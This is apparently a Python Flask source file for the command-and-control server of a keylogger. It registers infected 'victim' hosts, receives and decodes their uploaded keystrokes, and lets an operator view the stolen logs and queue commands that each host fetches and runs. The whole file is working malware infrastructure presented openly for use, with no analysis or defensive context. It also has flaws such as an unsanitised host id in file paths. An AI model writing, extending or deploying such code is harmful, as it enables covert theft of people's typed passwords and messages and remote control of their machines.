from flask import Flask, render_template, request
import os
import re
from urllib.parse import unquote
import json
from datetime import datetime
from filelock import FileLock

app = Flask(__name__)

def decode_keystrokes(data):
    # Clean raw string
    data = data.replace('\x10', '')  # Remove control char

    # Replace known key patterns with readable form
    special_keys = re.findall(r'%91(.*?)%93', data)
    for key in special_keys:
        data = data.replace(f'%91{key}%93', f'[{key}]')

    # Optionally decode %-encoded values (e.g., %-96)
    data = re.sub(r'%(-?\d+)', lambda m: chr(int(m.group(1))), data)

    return data

def update_last_seen(host_id):
    current_dir = os.getcwd()
    json_path = f"{current_dir}/last_seen.json"
    lock_path = json_path + ".lock"

    try:
        with FileLock(lock_path):
            if os.path.isfile(json_path):
                with open(json_path, "r") as f:
                    try:
                        data = json.load(f)
                    except json.JSONDecodeError:
                        print("Corrupt last_seen.json. Resetting.")
                        data = {}
            else:
                data = {}

            data[host_id] = datetime.utcnow().isoformat()

            with open(json_path, "w") as f:
                json.dump(data, f)
    except Exception as e:
        print(f"Failed to update last seen: {e}")


@app.route('/')
def hello_world():
    return render_template("test.html")

# Attacker routes
@app.route('/clients', methods=['GET'])
def get_clients():
    current_dir = os.getcwd()
    hosts_path = f"{current_dir}/hosts.txt"
    seen_path = f"{current_dir}/last_seen.json"

    try:
        with open(hosts_path, "r") as f:
            hosts = f.read().splitlines()
    except:
        return "Unable to grab client list. Please try again later."

    try:
        if os.path.isfile(seen_path):
            with open(seen_path, "r") as f:
                last_seen = json.load(f)
        else:
            last_seen = {}
    except:
        last_seen = {}

    output = ""
    for host in hosts:
        seen_time = last_seen.get(host, "Unknown")
        log_link = f"/logs?id={host}"
        output += f"Host: {host} | Last seen: {seen_time} | <a href='{log_link}'>View Logs</a><br>"

    return output

@app.route('/logs', methods=['GET'])
def get_logs():
    host_id = request.args["id"]
    current_dir = os.getcwd()
    try:
        # Return all logs for host if they have a file
        if os.path.isfile(f"{current_dir}/{host_id}.txt"):
            with open(f"{current_dir}/{host_id}.txt", "r") as f:
                data = f.read()
                return data.replace("\n", "<br>")
    except:
        return "Unable to grab client logs. Please try again later."

@app.route('/commands', methods=['GET'])
def get_commands():
    return render_template("commands.html")

@app.route('/commands', methods=['POST'])
def set_commands():
    current_dir = os.getcwd()
    host_id = request.form["hostid"]
    host_command = request.form["hostcommand"]
    try:
        with open(f"{current_dir}/{host_id}-C2.txt", "w") as f:
            f.write(host_command)
        return("Commands saved.")
    except:
        print("Unable to save host command to file,")
        return("Failed to save command. Please try again later.")


# Client routes
@app.route('/register', methods=['GET'])
def register():
    host_id = request.args["id"]
    update_last_seen(host_id)
    current_dir = os.getcwd()
    try:
        # We only register if client does not yet have a file
        if os.path.isfile(f"{current_dir}/{host_id}.txt"):
            return("Host already registered")
        else:
            # Create log file for victim
            with open(f"{current_dir}/{host_id}.txt", "a") as f:
                print("New victim!")
            # Add victim to known hosts.txt
            with open(f"{current_dir}/hosts.txt", "a") as f:
                f.write(f"{host_id}\n")
            return "Client registered"
    except:
        print("Unable to register victim")

@app.route('/command', methods=['GET'])
def get_command():
    id = request.args["id"]
    update_last_seen(id)
    current_dir = os.getcwd()
    file_name = f"{current_dir}/{id}-C2.txt"
    try:
        with open(file_name, "r") as f:
            command = f.read()
        os.remove(file_name)
        return command

    except:
        return("No commands found.")


@app.route('/upload', methods=['GET'])
def upload_data():
    print("Logs incoming!")
    host_id = request.args["id"]
    update_last_seen(id)
    host_data = request.args["data"]
    current_dir = os.getcwd()
    try:
        with open(f"{current_dir}/{host_id}.txt", "a") as f:
            f.write(f"{decode_keystrokes(host_data)}\n")
            return "Success"
    except:
        return "Failed to save data."


if __name__ == '__main__':
    app.run(host="0.0.0.0", port="8080")